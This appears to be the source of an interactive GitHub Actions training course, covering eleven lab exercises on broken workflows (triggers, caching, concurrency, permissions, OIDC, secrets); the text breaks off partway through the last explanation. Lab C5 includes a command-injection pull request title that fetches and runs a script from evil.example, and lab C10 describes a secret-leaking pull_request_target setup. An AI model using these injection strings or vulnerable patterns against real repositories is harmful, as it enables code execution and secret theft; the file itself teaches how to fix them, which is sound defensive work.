// Read and fix: a broken pipeline and what the team saw. Find the cause, fix it, and the checks show whether you did.
(function () {
  'use strict';
  var GA = window.GA, H = GA.h, lab = GA.lab, dl = GA.dl;
  var ctx = function (ev, ref, extra) { return H.gh(ev, ref, extra); };
  var sym = function (text, log) { return '<p><b>What the team saw.</b> ' + text + '</p>' + (log ? '<pre>' + log + '</pre>' : ''); };
  var injectionRe = /\$\{\{\s*github\.(event\.(pull_request|issue|comment|head_commit|review|pages|commits)[\w.\[\]*]*\.(title|body|message|label|ref|name|email|page_name)|head_ref)\b/;

  lab({
    id: 'C1', tag: 'Fix', title: 'No run starts: "Invalid workflow file"', level: 1,
    scenario: sym('You pushed the workflow. The Actions tab shows a red <b>Invalid workflow file</b> banner for <code>ci.yml</code>, and no run was created.'),
    task: '<p>Read the file, use the <b>Problems</b> panel as a guide, and fix it so it is a valid workflow that checks out the code and builds the API.</p>',
    starter: 'name: CI\non: [push]\njobs:\n  build:\n    step:\n      - uses: actions/checkout@v7\n      - run: dotnet build src/api\n',
    solution: 'name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - run: dotnet build src/api\n',
    expectStarterErrors: true,
    checks: [
      { label: 'The job <code>build</code> has <code>runs-on: ubuntu-latest</code>', test: function (d) { return (H.job(d, 'build') || {})['runs-on'] === 'ubuntu-latest'; } },
      { label: 'The job has a <code>steps</code> list', test: function (d) { return Array.isArray((H.job(d, 'build') || {}).steps); } },
      { label: 'It still checks out the code and runs <code>dotnet build src/api</code>', test: function (d) { return H.hasStepUses(d, 'actions/checkout') && /dotnet build src\/api/.test(H.runText(d)); } },
    ],
    traps: [],
    hints: ['The Problems panel names the line. Read each message: one key is spelled wrong, and one that every job needs is missing.', 'A job needs a runner (<code>runs-on</code>) and a list of <code>steps</code>.'],
    explain: dl([['The causes', '<code>step</code> is not a job key (the key is <code>steps</code>), and the job has no <code>runs-on</code>. GitHub reads the file when you push, and refuses to create a run for a file it cannot validate.'], ['How to avoid it', 'Run <code>actionlint</code> before you push (see the command drills). It finds these in under a second.']]),
  });

  lab({
    id: 'C2', tag: 'Fix', title: 'The release did not start for the tag', level: 1,
    scenario: sym('You ran <code>git tag v1.2.0 &amp;&amp; git push origin v1.2.0</code>. Nothing appeared in the Actions tab. Meanwhile, <b>every push to <code>main</code></b> starts the release job, which it should never do.'),
    task: '<p>The release workflow must start <b>only</b> when a tag such as <code>v1.2.0</code> is pushed, and never for a push to a branch.</p>',
    starter: 'name: Release\non:\n  push:\n    branches: [main]\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - run: echo "releasing ${{ github.ref_name }}"\n',
    solution: 'name: Release\non:\n  push:\n    tags: [\'v*\']\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - run: echo "releasing ${{ github.ref_name }}"\n',
    preview: { preset: 'tag', presets: ['tag', 'push-main'] },
    checks: [
      { label: 'Pushing the tag <code>v1.2.0</code> starts it', test: function (d) { return GA.eventMatches(d, { name: 'push', ref: 'refs/tags/v1.2.0', paths: [] }).runs; } },
      { label: 'Pushing to <code>main</code> or any branch does not', test: function (d) { return !GA.eventMatches(d, { name: 'push', ref: 'refs/heads/main', paths: ['a'] }).runs && !GA.eventMatches(d, { name: 'push', ref: 'refs/heads/feature/x', paths: ['a'] }).runs; } },
      { label: 'A tag that does not start with <code>v</code> does not', test: function (d) { return !GA.eventMatches(d, { name: 'push', ref: 'refs/tags/nightly', paths: [] }).runs; } },
    ],
    traps: [],
    hints: ['Look at the preview: choose "Push tag v1.2.0".', 'Branches and tags have separate filters. If you list only <code>branches</code>, tag pushes do not start it.'],
    explain: dl([['The rule', 'If you define only <code>tags</code> or only <code>branches</code>, the workflow does not run for the other kind of ref. The original file listed only <code>branches</code>, so tags were ignored and <code>main</code> pushes ran the release.'], ['Tag patterns', '<code>v*</code> matches any tag that starts with <code>v</code>. For strict versions use <code>v[0-9]+.[0-9]+.[0-9]+</code>.']]),
  });

  lab({
    id: 'C3', tag: 'Fix', title: 'The deploy job is skipped on main', level: 2,
    scenario: sym('After a merge to <code>main</code>, the <code>build</code> job is green but <code>deploy</code> shows <b>This check was skipped.</b> It is never run, even on <code>main</code>.'),
    task: '<p>Make <code>deploy</code> run after <code>build</code>, for pushes to <code>main</code> only.</p>',
    starter: 'name: CD\non:\n  push:\n    branches: [main]\n  pull_request:\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "build"\n  deploy:\n    needs: [bulid]\n    if: github.ref == \'main\'\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "deploy"\n',
    solution: 'name: CD\non:\n  push:\n    branches: [main]\n  pull_request:\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "build"\n  deploy:\n    needs: [build]\n    if: github.event_name == \'push\' && github.ref == \'refs/heads/main\'\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "deploy"\n',
    expectStarterErrors: true, preview: { preset: 'push-main', presets: ['push-main', 'pr'] },
    checks: [
      { label: '<code>deploy</code> needs <code>build</code>', test: function (d) { return H.list((H.job(d, 'deploy') || {}).needs).indexOf('build') >= 0; } },
      { label: '<code>deploy</code> runs for a push to <code>main</code>', test: function (d) { var j = H.job(d, 'deploy'); return !!j && H.evalIf(j.if, ctx('push', 'refs/heads/main')) === true; } },
      { label: '<code>deploy</code> does not run for pull requests or other branches', test: function (d) { var j = H.job(d, 'deploy'); return !!j && H.evalIf(j.if, ctx('pull_request', 'refs/pull/7/merge')) === false && H.evalIf(j.if, ctx('push', 'refs/heads/feature/x')) === false; } },
    ],
    traps: [],
    hints: ['Two separate mistakes. The checker finds one for you; the preview shows the other.', '<code>github.ref</code> holds the <em>full</em> ref name.'],
    explain: dl([['Cause 1', '<code>needs: [bulid]</code> is a typo, so the job named a dependency that does not exist. The checker flags it, and a file with that error does not run.'], ['Cause 2', '<code>github.ref</code> is <code>refs/heads/main</code>, never <code>main</code>. The comparison was always false, so the job was always skipped. Use the full ref, or <code>github.ref_name == \'main\'</code>.'], ['Lesson', 'A skipped job is quiet. When a job does not run, read its <code>if</code>, and look at the context values it compares.']]),
  });

  lab({
    id: 'C4', tag: 'Fix', title: 'The cache never hits', level: 3,
    scenario: sym('Every run downloads all the NuGet packages again, even when nothing changed. The log of the cache step always says the same thing, and the repository\'s cache list grows with a new entry on every run:', 'Run actions/cache@v6\nCache not found for input keys: Linux-nuget-3d3c42e5aac5ba805825da76410c181273ba90b1\n…\nPost job cleanup.\nCache saved successfully'),
    task: '<p>Fix the cache so that a run with the same <code>.csproj</code> files restores the cache, and a changed project still starts from the latest older cache.</p>',
    starter: 'name: API CI\non: pull_request\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - uses: actions/setup-dotnet@v6\n        with:\n          dotnet-version: 10.0.x\n      - uses: actions/cache@v6\n        with:\n          path: ~/.nuget/packages\n          key: ${{ runner.os }}-nuget-${{ github.sha }}\n      - run: dotnet build src/api\n',
    solution: 'name: API CI\non: pull_request\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - uses: actions/setup-dotnet@v6\n        with:\n          dotnet-version: 10.0.x\n      - uses: actions/cache@v6\n        with:\n          path: ~/.nuget/packages\n          key: ${{ runner.os }}-nuget-${{ hashFiles(\'**/*.csproj\') }}\n          restore-keys: |\n            ${{ runner.os }}-nuget-\n      - run: dotnet build src/api\n',
    preview: false,
    checks: [
      { label: 'The key no longer contains <code>github.sha</code>', test: function (d) { return H.hasStepUses(d, 'actions/cache', function (s) { return !/github\.sha/.test(String(s.with && s.with.key)); }); } },
      { label: 'The key has <code>runner.os</code> and <code>hashFiles</code> of the <code>.csproj</code> files', test: function (d) { return H.hasStepUses(d, 'actions/cache', function (s) { var k = String(s.with && s.with.key); return /runner\.os/.test(k) && /hashFiles\([^)]*csproj/.test(k); }); } },
      { label: '<code>restore-keys</code> falls back to the same prefix without the hash', test: function (d) { return H.hasStepUses(d, 'actions/cache', function (s) { var r = String((s.with || {})['restore-keys']); return /runner\.os/.test(r) && !/hashFiles/.test(r); }); } },
    ],
    traps: [],
    hints: ['A cache is found only by an <b>exact</b> match on <code>key</code> (or a prefix match on <code>restore-keys</code>). Ask yourself: is the key ever the same twice?', '<code>hashFiles(\'**/*.csproj\')</code> gives a value that changes only when a project file changes.'],
    explain: dl([['Cause', '<code>github.sha</code> is different for every commit. No key ever matched, so every run missed, ran the whole restore, and saved a new cache that nothing would ever use, filling the 10 GB until older entries were evicted.'], ['The fix', 'A key that changes only when the inputs change: <code>hashFiles(\'**/*.csproj\')</code>. <code>restore-keys</code> lets a changed project start from the most recent older cache instead of from nothing.']]),
  });

  lab({
    id: 'C5', tag: 'Fix', title: 'A pull request title ran a command', level: 3,
    scenario: sym('A security review found that a contributor opened a pull request titled <code>x"; curl https://evil.example/s.sh | sh; echo "</code>, and the runner downloaded and ran the script. The workflow just prints the title.'),
    task: '<p>Keep printing the title, but make it impossible for the title to be run as a command.</p>',
    starter: 'name: PR info\non:\n  pull_request:\n    types: [opened, edited]\npermissions:\n  contents: read\njobs:\n  info:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Print the title\n        run: echo "Title is ${{ github.event.pull_request.title }}"\n',
    solution: 'name: PR info\non:\n  pull_request:\n    types: [opened, edited]\npermissions:\n  contents: read\njobs:\n  info:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Print the title\n        env:\n          TITLE: ${{ github.event.pull_request.title }}\n        run: echo "Title is $TITLE"\n',
    expectStarterErrors: true, preview: false,
    checks: [
      { label: 'The title is no longer inside the <code>run</code> script', test: function (d) { return !injectionRe.test(H.runText(d)); } },
      { label: 'It is passed in <code>env</code> (<code>TITLE: ${{ github.event.pull_request.title }}</code>) and printed as <code>"$TITLE"</code>', test: function (d) { return H.all(d).some(function (s) { return s.env && /github\.event\.pull_request\.title/.test(String(s.env.TITLE)) && /\$\{?TITLE\}?/.test(s.run || ''); }); } },
      { label: 'The workflow still prints the title', test: function (d) { return /Title is/.test(H.runText(d)); } },
    ],
    traps: [],
    hints: ['The <code>${{ }}</code> text is replaced <b>before</b> the shell runs the script, so the title becomes part of the script.', 'An environment variable is data. The shell reads <code>$TITLE</code> at run time and never parses what is inside it.'],
    explain: dl([['The attack', 'Expressions are substituted into the script text first. A title with a quote and a semicolon ends your <code>echo</code> and starts the attacker\'s command, with your runner and your secrets.'], ['The fix', 'Put the value in <code>env</code> and use the shell variable. The checker (actionlint) warns about exactly this pattern. Treat these as untrusted: titles, bodies, branch names, commit messages, issue and comment text.']]),
  });

  lab({
    id: 'C6', tag: 'Fix', title: 'The second matrix job cannot upload', level: 3,
    scenario: sym('The test matrix runs on Ubuntu and Windows. One leg succeeds, and the other fails at the upload step. The <code>report</code> job then cannot find the results either.', 'Error: Failed to CreateArtifact: Received non-retryable error: Failed request: (409) Conflict: an artifact with this name already exists on the workflow run'),
    task: '<p>Both legs must upload their results without conflict, and <code>report</code> must download <b>all</b> of them into one folder.</p>',
    starter: 'name: Tests\non: pull_request\njobs:\n  test:\n    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, windows-latest]\n    steps:\n      - uses: actions/checkout@v7\n      - run: dotnet test src/api --logger trx --results-directory results\n      - uses: actions/upload-artifact@v7\n        if: ${{ !cancelled() }}\n        with:\n          name: test-results\n          path: results\n  report:\n    needs: test\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/download-artifact@v8\n        with:\n          name: test-results\n          path: all-results\n',
    solution: 'name: Tests\non: pull_request\njobs:\n  test:\n    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, windows-latest]\n    steps:\n      - uses: actions/checkout@v7\n      - run: dotnet test src/api --logger trx --results-directory results\n      - uses: actions/upload-artifact@v7\n        if: ${{ !cancelled() }}\n        with:\n          name: test-results-${{ matrix.os }}\n          path: results\n  report:\n    needs: test\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/download-artifact@v8\n        with:\n          pattern: test-results-*\n          merge-multiple: true\n          path: all-results\n',
    preview: false,
    checks: [
      { label: 'The uploaded artifact name includes <code>matrix.os</code>, so every leg has its own', test: function (d) { return H.hasStepUses(d, 'actions/upload-artifact', function (s) { return /matrix\.os/.test(String(s.with && s.with.name)); }); } },
      { label: '<code>report</code> downloads with <code>pattern: test-results-*</code>', test: function (d) { return H.steps(H.job(d, 'report') || {}).some(function (s) { var u = GA.parseUses(s.uses); return u && u.repo === 'actions/download-artifact' && s.with && s.with.pattern === 'test-results-*'; }); } },
      { label: '… and <code>merge-multiple: true</code>, so all files land in one folder', test: function (d) { return H.steps(H.job(d, 'report') || {}).some(function (s) { var u = GA.parseUses(s.uses); return u && u.repo === 'actions/download-artifact' && s.with && s.with['merge-multiple'] === true; }); } },
      { label: '<code>report</code> no longer asks for a single artifact called <code>test-results</code>', test: function (d) { return !H.steps(H.job(d, 'report') || {}).some(function (s) { return s.with && s.with.name === 'test-results'; }); } },
    ],
    traps: [],
    hints: ['Artifacts are immutable, and their names must be unique within a run. Two jobs cannot add to the same one.', 'To fetch several artifacts at once, <code>download-artifact</code> accepts a <code>pattern</code>.'],
    explain: dl([['Cause', 'Since version 4 of the artifact actions, an artifact is created once and cannot be added to. Both legs used the same name, so the second got a 409 Conflict. The upload action\'s own README advises naming with a matrix prefix or suffix.'], ['The second problem', 'After renaming, nothing is called <code>test-results</code> any more, so the download would fail. <code>pattern</code> matches several artifacts and <code>merge-multiple: true</code> puts their files in one folder.']]),
  });

  lab({
    id: 'C7', tag: 'Fix', title: 'An old deploy overwrote a newer one', level: 4,
    scenario: sym('Two merges landed a minute apart. Someone added a <code>concurrency</code> block to stop deploys overlapping, and <b>then</b> a deploy was cancelled halfway and left production half updated. Before the block, both runs executed at the same time and the older one finished last.'),
    task: '<p>Deploys to production must never overlap, and a deploy that has started must <b>never be cancelled</b> halfway. A newer push may wait its turn.</p>',
    starter: 'name: Deploy\non:\n  push:\n    branches: [main]\nconcurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: true\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "build and test"\n  production:\n    needs: build\n    runs-on: ubuntu-latest\n    environment: production\n    steps:\n      - run: echo "deploying ${{ github.sha }}"\n',
    solution: 'name: Deploy\non:\n  push:\n    branches: [main]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "build and test"\n  production:\n    needs: build\n    runs-on: ubuntu-latest\n    environment: production\n    concurrency:\n      group: deploy-production\n      cancel-in-progress: false\n    steps:\n      - run: echo "deploying ${{ github.sha }}"\n',
    preview: { preset: 'push-main', presets: ['push-main'] },
    checks: [
      { label: 'The workflow-level <code>concurrency</code> no longer cancels a running deploy', test: function (d) { var c = d.concurrency; if (!c) return true; if (typeof c === 'string') return true; var cip = c['cancel-in-progress']; if (cip === undefined || cip === false) return true; if (typeof cip === 'string') return H.evalIf(cip.replace(/^\$\{\{|\}\}$/g, ''), ctx('push', 'refs/heads/main')) === false; return false; } },
      { label: 'The <code>production</code> job has its own concurrency group', test: function (d) { var c = (H.job(d, 'production') || {}).concurrency; return !!c && !!(typeof c === 'string' ? c : c.group); } },
      { label: 'In that group a running deploy is <b>not</b> cancelled (<code>cancel-in-progress: false</code>)', test: function (d) { var c = (H.job(d, 'production') || {}).concurrency; return !!c && typeof c === 'object' && c['cancel-in-progress'] === false; } },
      { label: 'The group name does not depend on the commit, so two different commits share it', test: function (d) { var c = (H.job(d, 'production') || {}).concurrency; var g = c && (typeof c === 'string' ? c : c.group); return !!g && !/github\.sha/.test(g); } },
    ],
    traps: [],
    hints: ['Think about <b>which job</b> must be protected, not the whole workflow. The build is safe to cancel; the deploy is not.', 'By default, only one run per group executes at a time and one more can wait (pending). A newer pending run replaces an older pending one.'],
    explain: dl([['Cause 1', 'With no concurrency, two runs deploy at once and the one that happens to finish last wins, even if it is the older commit.'], ['Cause 2', 'The workflow-level group with <code>cancel-in-progress: true</code> cancelled the <em>running</em> deploy when a newer push arrived. Cancelling a deploy leaves things half done.'], ['The fix', 'A group on the production job, with <code>cancel-in-progress: false</code>: the running deploy finishes, and the newest waiting run goes next (older waiting runs are dropped, which is fine because the newest commit includes them).']]),
  });

  lab({
    id: 'C8', tag: 'Fix', title: '"Resource not accessible by integration"', level: 4,
    scenario: sym('The release workflow worked in the old repository. In the new one it fails when it creates the release:', 'gh release create v1.2.0 --generate-notes\nHTTP 403: Resource not accessible by integration (https://api.github.com/repos/octocat/infra-setup/releases)'),
    task: '<p>Give the release job the access it needs to create a release, and <b>nothing more than that</b>. The other jobs and the rest of the workflow must stay read-only.</p>',
    starter: 'name: Release\non:\n  push:\n    tags: [\'v*\']\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - run: dotnet test src/api\n  release:\n    needs: test\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - name: Create the release\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        run: gh release create "$GITHUB_REF_NAME" --generate-notes\n',
    solution: 'name: Release\non:\n  push:\n    tags: [\'v*\']\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - run: dotnet test src/api\n  release:\n    needs: test\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - uses: actions/checkout@v7\n      - name: Create the release\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        run: gh release create "$GITHUB_REF_NAME" --generate-notes\n',
    preview: { preset: 'tag', presets: ['tag'] },
    checks: [
      { label: 'The <code>release</code> job has <code>contents: write</code>', test: function (d) { var p = (H.job(d, 'release') || {}).permissions; return !!p && p.contents === 'write'; } },
      { label: 'The workflow level stays <code>contents: read</code>', test: function (d) { return !!d.permissions && d.permissions === Object(d.permissions) && d.permissions.contents === 'read' && Object.keys(d.permissions).length === 1; } },
      { label: 'The <code>test</code> job gets no write permission', test: function (d) { var p = (H.job(d, 'test') || {}).permissions; return !p || Object.keys(p).every(function (k) { return p[k] !== 'write'; }); } },
      { label: 'The release job has no permission it does not need (only <code>contents</code>)', test: function (d) { var p = (H.job(d, 'release') || {}).permissions; return !!p && typeof p === 'object' && Object.keys(p).every(function (k) { return k === 'contents'; }); } },
    ],
    traps: [{ test: function (d) { return d.permissions === 'write-all' || (H.job(d, 'release') || {}).permissions === 'write-all'; }, msg: '<code>write-all</code> would work, and would also give the token every other write permission.', line: function (t) { return H.lineOf(t, /write-all/); } }],
    hints: ['The token was read-only for the whole workflow. Which one job needs more?', 'A release is a "contents" object. The scope has a read and a write level.'],
    explain: dl([['Cause', 'The workflow declared <code>contents: read</code>, which is right for building and testing, but creating a release needs <code>contents: write</code>. The 403 means the token is valid but not allowed.'], ['The fix', 'Raise it on <b>one job</b>, not the workflow. A job-level <code>permissions</code> replaces the workflow-level one for that job, so that job gets only <code>contents: write</code>.']]),
  });

  lab({
    id: 'C9', tag: 'Fix', title: 'AWS refuses the identity token', level: 4,
    scenario: sym('The deploy to AWS fails at the login step. The role\'s trust policy was written by the platform team, and it was checked twice:', 'Configure AWS credentials\nError: Not authorized to perform sts:AssumeRoleWithWebIdentity\n\nTrust policy of todo-deploy (Condition):\n  token.actions.githubusercontent.com:aud = sts.amazonaws.com\n  token.actions.githubusercontent.com:sub = repo:octocat@123456/infra-setup@789012:environment:production'),
    task: '<p>The login itself is configured correctly, the permission is set, and the role exists. Read the trust policy\'s <code>sub</code> carefully, then change the <b>workflow</b> so its token matches.</p>',
    starter: 'name: Deploy\non:\n  push:\n    branches: [main]\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n      contents: read\n    steps:\n      - uses: aws-actions/configure-aws-credentials@v6\n        with:\n          role-to-assume: arn:aws:iam::123456789012:role/todo-deploy\n          aws-region: eu-west-1\n      - run: aws sts get-caller-identity\n',
    solution: 'name: Deploy\non:\n  push:\n    branches: [main]\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    environment: production\n    permissions:\n      id-token: write\n      contents: read\n    steps:\n      - uses: aws-actions/configure-aws-credentials@v6\n        with:\n          role-to-assume: arn:aws:iam::123456789012:role/todo-deploy\n          aws-region: eu-west-1\n      - run: aws sts get-caller-identity\n',
    preview: false,
    checks: [
      { label: 'The job uses the environment named in the trust policy: <code>production</code>', test: function (d) { var e = (H.job(d, 'deploy') || {}).environment; return (typeof e === 'string' ? e : (e || {}).name) === 'production'; } },
      { label: 'It still has <code>id-token: write</code> and <code>contents: read</code>', test: function (d) { var p = (H.job(d, 'deploy') || {}).permissions; return !!p && p['id-token'] === 'write' && p.contents === 'read'; } },
      { label: 'It still assumes the same role in the same region', test: function (d) { return H.hasStepUses(d, 'aws-actions/configure-aws-credentials', function (s) { return s.with && s.with['role-to-assume'] === 'arn:aws:iam::123456789012:role/todo-deploy' && s.with['aws-region'] === 'eu-west-1'; }); } },
    ],
    traps: [{ test: function (d, t) { return /AWS_ACCESS_KEY|secrets\.AWS/.test(t); }, msg: 'Do not fix an identity mismatch by going back to stored keys.' }],
    hints: ['A token\'s <code>sub</code> is built from the job: for a job on a branch it ends with <code>:ref:refs/heads/main</code>. What does the policy ask for instead?', 'GitHub puts the environment name in the subject <b>only if the job declares an environment</b>.'],
    explain: dl([['Cause', 'The trust policy only accepts a token whose subject ends in <code>:environment:production</code>. This job did not declare an environment, so its token\'s subject ended in <code>:ref:refs/heads/main</code>, and AWS correctly refused it.'], ['The numbers in the subject', '<code>octocat@123456/infra-setup@789012</code> is the immutable form (owner and repository ids), used for repositories created, renamed or transferred after 15 July 2026. Copying an old-format policy (<code>repo:octocat/infra-setup:…</code>) to such a repository gives the same refusal, with the environment in place.'], ['How to see the real subject', 'GitHub\'s <code>actions-oidc-debugger</code> action prints the claims of the token a run would send, before you write the trust policy.']]),
  });

  lab({
    id: 'C10', tag: 'Fix', title: 'A fork\'s pull request read the secrets', level: 5,
    scenario: sym('An outside contributor\'s pull request changed the test project to print an environment variable. The next workflow run wrote the real <code>NUGET_TOKEN</code> into a public log. The workflow was written so that "forks can run tests with our token":'),
    task: '<p>The tests do not actually need the token. Make the workflow safe: untrusted pull request code must run <b>without</b> secrets and with a read-only token.</p>',
    starter: 'name: PR tests\non:\n  pull_request_target:\n    types: [opened, synchronize]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - name: Test\n        env:\n          NUGET_TOKEN: ${{ secrets.NUGET_TOKEN }}\n        run: dotnet test src/api\n',
    solution: 'name: PR tests\non:\n  pull_request:\n    types: [opened, synchronize]\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n        with:\n          persist-credentials: false\n      - name: Test\n        run: dotnet test src/api\n',
    preview: { preset: 'pr', presets: ['pr'] },
    checks: [
      { label: 'The workflow uses <code>pull_request</code>, not <code>pull_request_target</code>', test: function (d) { var o = H.on(d); return o.pull_request !== undefined && o.pull_request_target === undefined; } },
      { label: 'No step checks out the pull request head by hand (<code>ref</code> / <code>repository</code> pointing at the fork)', test: function (d, t) { return !/github\.event\.pull_request\.head\.(sha|ref|repo)/.test(t) && !/refs\/pull\//.test(t); } },
      { label: 'No secret is passed to code that runs the pull request', test: function (d, t) { return !/secrets\.(?!GITHUB_TOKEN)/.test(t); } },
      { label: 'The token is read-only: <code>permissions: contents: read</code>', test: function (d) { return !!d.permissions && d.permissions.contents === 'read' && Object.keys(d.permissions).length === 1; } },
      { label: 'It still runs <code>dotnet test src/api</code>', test: function (d) { return /dotnet test src\/api/.test(H.runText(d)); } },
    ],
    traps: [{ test: function (d, t) { return H.on(d).pull_request_target !== undefined && /head\.sha|head\.ref/.test(t); }, msg: 'This is a "pwn request": a privileged trigger that checks out and runs code from the pull request. Whoever can open a pull request can run code with your token and secrets.', line: function (t) { return H.lineOf(t, /pull_request_target/); } }],
    hints: ['What is the difference between <code>pull_request</code> and <code>pull_request_target</code> in <b>which code runs</b> and <b>which secrets it sees</b>?', 'If the checkout is the default branch\'s code, it is trusted; if it is the fork\'s head, it is not.'],
    explain: dl([['Cause', '<code>pull_request_target</code> runs the workflow with the base repository\'s secrets and a writable token. The file then checked out the fork\'s code and ran it. That hands the secrets to whoever wrote the pull request.'], ['The fix', '<code>pull_request</code> runs from the pull request\'s merge commit, with a read-only token and no secrets for forks. Tests of the contributor\'s code belong there.'], ['If you must use <code>pull_request_target</code>', 'Never run the pull request\'s code in it (no build, test, or install of what you checked out). Use it only for work on metadata, such as labelling. <code>actions/checkout@v7</code> also refuses a fork\'s head ref in this event unless you set <code>allow-unsafe-pr-checkout: true</code>; do not.'], ['Date to know', 'GitHub is adding a default policy that blocks <code>pull_request_target</code> in public repositories, enforced from 2 November 2026 for repositories that were on the default policy before it became generally available.']]),
  });

  lab({
    id: 'C11', tag: 'Fix', title: 'The pipeline with seven problems', level: 5,
    scenario: sym('A platform review of this pipeline found <b>seven</b> separate problems: one that stops it from running, one that makes a job always run, and five that are about security and reliability. Find and fix every one without changing what the pipeline does.'),
    task: '<p>Read it top to bottom with the method: <b>triggers → permissions → job graph → conditions → secrets → pins → timeouts</b>. The Problems panel finds some; you must find the others. The requirements on the right show only a count, and each one is described once you have fixed it.</p>',
    starter: 'name: Pipeline\non:\n  push:\n    branches: [main]\npermissions: write-all\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@main\n      - run: dotnet test src/api\n  image:\n    needs: [tests]\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - name: Log in\n        run: echo ${{ secrets.DOCKERHUB_TOKEN }} | docker login -u todo --password-stdin\n      - name: Build and push\n        run: |\n          docker build -t todo/api:latest src/api\n          docker push todo/api:latest\n  deploy:\n    needs: image\n    if: "${{ github.ref }} == \'refs/heads/main\'"\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "deploy latest"\n',
    solution: 'name: Pipeline\non:\n  push:\n    branches: [main]\npermissions:\n  contents: read\njobs:\n  test:\n    runs-on: ubuntu-latest\n    timeout-minutes: 15\n    steps:\n      - uses: actions/checkout@v7\n      - run: dotnet test src/api\n  image:\n    needs: [test]\n    runs-on: ubuntu-latest\n    timeout-minutes: 20\n    steps:\n      - uses: actions/checkout@v7\n      - name: Log in\n        env:\n          DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}\n        run: echo "$DOCKERHUB_TOKEN" | docker login -u todo --password-stdin\n      - name: Build and push\n        run: |\n          docker build -t "todo/api:${GITHUB_SHA::7}" src/api\n          docker push "todo/api:${GITHUB_SHA::7}"\n  deploy:\n    needs: image\n    if: github.ref == \'refs/heads/main\'\n    runs-on: ubuntu-latest\n    timeout-minutes: 15\n    steps:\n      - run: echo "deploy ${GITHUB_SHA::7}"\n',
    expectStarterErrors: true, preview: { preset: 'push-main', presets: ['push-main'] },
    checks: [
      { label: '1 · The file can run: every <code>needs</code> names a job that exists', test: function (d) { var ids = Object.keys(H.jobs(d)); return ids.every(function (id) { return H.list((H.job(d, id) || {}).needs).every(function (n) { return ids.indexOf(n) >= 0; }); }); } },
      { label: '2 · The token has no blanket write access (no <code>write-all</code>)', test: function (d) { return d.permissions !== 'write-all' && !!d.permissions && typeof d.permissions === 'object' && Object.values(d.permissions).every(function (v) { return v !== 'write'; }); } },
      { label: '3 · No action follows a branch (<code>@main</code>, <code>@master</code>, <code>@latest</code>)', test: function (d) { return GA.usesList(d).every(function (u) { return u.local || !/^(main|master|latest|dev|develop)$/i.test(u.ref); }); } },
      { label: '4 · The secret is not written inside a <code>run</code> script', test: function (d) { return !/\$\{\{\s*secrets\./.test(H.runText(d)); } },
      { label: '5 · Images are tagged with the commit, not <code>latest</code>', test: function (d) { var r = H.runText(d); return !/:latest\b/.test(r) && /(GITHUB_SHA|github\.sha)/.test(r) && /docker push/.test(r); } },
      { label: '6 · The <code>deploy</code> condition really checks the branch (true on main, false elsewhere)', test: function (d) { var j = H.job(d, 'deploy'); return !!j && j.if !== undefined && H.evalIf(j.if, ctx('push', 'refs/heads/main')) === true && H.evalIf(j.if, ctx('push', 'refs/heads/feature/x')) === false; } },
      { label: '7 · Every job has a <code>timeout-minutes</code> of 30 or less', test: function (d) { var ids = Object.keys(H.jobs(d)); return ids.length === 3 && ids.every(function (id) { var t = Number((H.job(d, id) || {})['timeout-minutes']); return t > 0 && t <= 30; }); } },
      { label: 'Nothing was removed: still <code>test</code>, <code>image</code> and <code>deploy</code> in that order, and the secret is still used', test: function (d) { return !!H.job(d, 'test') && H.list((H.job(d, 'image') || {}).needs).indexOf('test') >= 0 && H.list((H.job(d, 'deploy') || {}).needs).indexOf('image') >= 0 && /secrets\.DOCKERHUB_TOKEN/.test(JSON.stringify(d)); } },
    ],
    traps: [],
    hints: ['The checker will tell you about the typo in <code>needs</code>. For the rest, read each job as if you were reviewing a pull request.', 'Three problems are about <b>what a script can leak or run</b>. Two are about <b>how a condition is written</b> and <b>what the image is called</b>.', 'The <code>if</code> mixes text and <code>${{ }}</code>: the whole value is then a non-empty string.'],
    explain: dl([
      ['1 · <code>needs: [tests]</code>', 'A typo for <code>test</code>. The file is invalid, so nothing runs.'],
      ['2 · <code>write-all</code>', 'Every job could write to the repository, packages, and more. Start from <code>contents: read</code> and add per job.'],
